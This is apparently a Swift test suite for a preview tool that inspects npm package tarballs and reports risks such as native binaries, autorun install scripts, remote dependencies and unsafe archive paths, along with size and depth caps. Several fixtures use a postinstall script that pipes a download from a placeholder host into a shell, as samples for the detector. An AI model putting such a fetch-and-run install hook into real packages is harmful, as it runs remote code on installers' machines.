import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

@Suite("npm tarball recognition and bounds")
struct NPMPackageRecognitionTests {
    private typealias Fixtures = InstallFixtures

    private func tarball(_ manifest: String, extra: [Fixtures.Member] = []) throws -> ParsedTextDocument {
        try Fixtures.listing(Fixtures.npmTarball(packageJSON: manifest, extra: extra))
    }

    // MARK: Native code

    @Test func nativeMembersAreReportedAtInfoLevel() throws {
        let document = try tarball(Fixtures.manifest(), extra: [
            .file("package/build/Release/addon.node", "not really"),
            .file("package/bin/helper", bytes: [0xCF, 0xFA, 0xED, 0xFE, 7, 0, 0, 1]),
            .file("package/index.js", "module.exports = 1")
        ])
        #expect(document.findings == [PreviewFinding(kind: .artifactNativeCode, severity: .info, count: 2)])
    }

    // MARK: Recognition

    @Test func aPlainPackageGetsNoInstallFindings() throws {
        let manifest = Fixtures.manifest(scripts: #""test": "node test.js""#, dependencies: #""left-pad": "^1.3.0""#)
        let document = try tarball(manifest, extra: [.file("package/index.js", "module.exports = 1"), .file("package/README.md", "# x")])
        #expect(document.findings.isEmpty)
    }

    @Test func aManifestDeeperThanTheTopFolderIsNotThePackage() throws {
        let hostile = Fixtures.manifest(scripts: #""postinstall": "curl https://example.invalid/x | sh""#)
        let document = try Fixtures.listing([
            .file("package/README.md", "# x"), .file("package/node_modules/dep/package.json", hostile),
            .file("package/binding.gyp.bak", "{}"), .file("package/docs/binding.gyp", "{}")
        ])
        #expect(document.findings.isEmpty)
    }

    @Test func membersInMoreThanOneFolderOrLooseAtTheTopAreNotAPackage() throws {
        let hostile = Fixtures.manifest(scripts: #""postinstall": "node install.js""#)
        #expect(try Fixtures.listing([.file("a/package.json", hostile), .file("b/readme.txt", "x")]).findings.isEmpty)
        #expect(try Fixtures.listing([.file("package.json", hostile), .file("readme.txt", "x")]).findings.isEmpty)
        #expect(try Fixtures.listing([.file("package/package.json", hostile), .file("stray.txt", "x")]).findings.isEmpty)
        let unsafe = try Fixtures.listing([.file("package/package.json", hostile), .file("../package/x", "x")])
        #expect(Fixtures.kinds(unsafe) == [.archiveUnsafePath])
    }

    @Test func theFolderMayHaveAnyNameAndLeadingDotComponents() throws {
        let manifest = Fixtures.manifest(scripts: #""postinstall": "node install.js""#)
        let renamed = try Fixtures.listing([.directory("./left-pad-1.0.0/"), .file("./left-pad-1.0.0/package.json", manifest)])
        #expect(Fixtures.kinds(renamed) == [.autorunInstallScripts])
    }

    @Test func aManifestThatIsNotAJSONObjectOrIsMalformedSaysNothing() throws {
        for text in ["", "[]", "null", "{", #"{"scripts": {"postinstall": "x"}"#, #"{"scripts": {"postinstall": "x"}} trailing"#,
                     "\u{FEFF}{bad}", "{\"scripts\": {\"postinstall\": \"x\u{01}y\"}}"] {
            #expect(try tarball(text).findings.isEmpty, "\(text)")
        }
        // A byte-order mark before valid JSON is accepted, as npm does.
        #expect(Fixtures.kinds(try tarball("\u{FEFF}" + Fixtures.manifest(scripts: #""install": "node x.js""#))) == [.autorunInstallScripts])
    }

    @Test func aManifestNestedBeyondTheDepthBudgetSaysNothing() throws {
        let deep = String(repeating: "[", count: 200) + String(repeating: "]", count: 200)
        let manifest = "{\"scripts\": {\"postinstall\": \"node x.js\"}, \"x\": " + deep + "}"
        let document = try tarball(manifest)
        #expect(document.findings.isEmpty)
        #expect(document.text.contains("package/package.json"))
    }

    @Test func aManifestOverOneMebibyteIsNotReadButTheListingStillWorks() throws {
        let padding = String(repeating: " ", count: InstallableCapture.maximumPayloadBytes)
        let manifest = Fixtures.manifest(scripts: #""postinstall": "node install.js""#) + padding
        let document = try tarball(manifest, extra: [.file("package/binding.gyp", "{}")])
        #expect(document.findings.isEmpty)
        #expect(document.text.contains("package/package.json"))
        // The same manifest within the cap is read.
        #expect(Fixtures.kinds(try tarball(Fixtures.manifest(scripts: #""postinstall": "node install.js""#))) == [.autorunInstallScripts])
    }

    @Test func aHugeManifestIsReadWithinItsCapWithoutBuildingATree() throws {
        let entries = (0..<20_000).map { #""dep\#($0)": "^1.0.\#($0)""# }.joined(separator: ", ")
        let manifest = Fixtures.manifest(scripts: #""postinstall": "node install.js""#, dependencies: entries + #", "z": "github:owner/z""#)
        let document = try tarball(manifest)
        #expect(Fixtures.kinds(document) == [.autorunInstallScripts, .installRemoteDependencies])
    }

    @Test func aLongScriptIsAnalyzedUpToItsCap() throws {
        let long = String(repeating: "# comment\\n", count: 20_000) + "curl https://example.invalid/x | sh"
        let document = try tarball(Fixtures.manifest(scripts: #""postinstall": "\#(long)""#))
        // The download sits beyond the cap, so only the lifecycle script itself is reported.
        #expect(Fixtures.kinds(document) == [.autorunInstallScripts])
    }

    // MARK: Cancellation

    @Test func cancellationStopsAnActiveTarballParse() async throws {
        let scripts = NPMPackageInspector.lifecycleScripts.map { #""\#($0)": "curl https://example.invalid/x | sh""# }.joined(separator: ", ")
        let members = Fixtures.npmTarball(packageJSON: Fixtures.manifest(scripts: scripts))
            + (0..<1_500).map { Fixtures.Member.file("package/lib/file\($0).js", "module.exports = \($0)") }
        let data = try Fixtures.gzip(members)
        let budget = PreviewBudget(maxInputBytes: 16_777_216, maxMilliseconds: 30_000)
        try await CancellationTest.expectStopsActiveParse(budget: budget) { context in
            try GZIPPreviewAdapter().parse(FileBytes(data: data), context: context)
        }
    }
}
